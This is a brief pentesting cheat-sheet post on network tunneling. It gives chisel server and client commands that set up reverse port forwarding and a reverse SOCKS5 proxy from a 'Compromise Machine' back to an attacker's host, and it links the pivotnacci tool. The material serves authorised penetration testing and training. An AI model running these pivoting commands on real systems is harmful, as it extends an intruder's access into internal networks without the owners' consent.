---
layout: post
title: "Tunneling"
os: ["Windows", "Linux"]
tags: ["Port Forwarding", "SOCKS", "Tunneling"]
section: "Tunneling"
---

# Port Forwarding
  
Start chisel on atack machine

```bash
./chisel server --reverse -p "listen port"
```


# Start communication between Attach machine and Compromise Machine
```bash
./chisel client "attacker IP":"attacker Port" R:"local port":"IP to expose":"Port to expose"
```

# SOCKS

Start chisel on atack machine

```bash
./chisel server --socks5 --reverse [-p "PORT"]
```

# Start communication between Attach machine and Compromise Machine

```bash
./chisel client "attacker IP":"port" R:socks
```
# pivotnacci

[https://github.com/blackarrowsec/pivotnacci](https://github.com/blackarrowsec/pivotnacci)
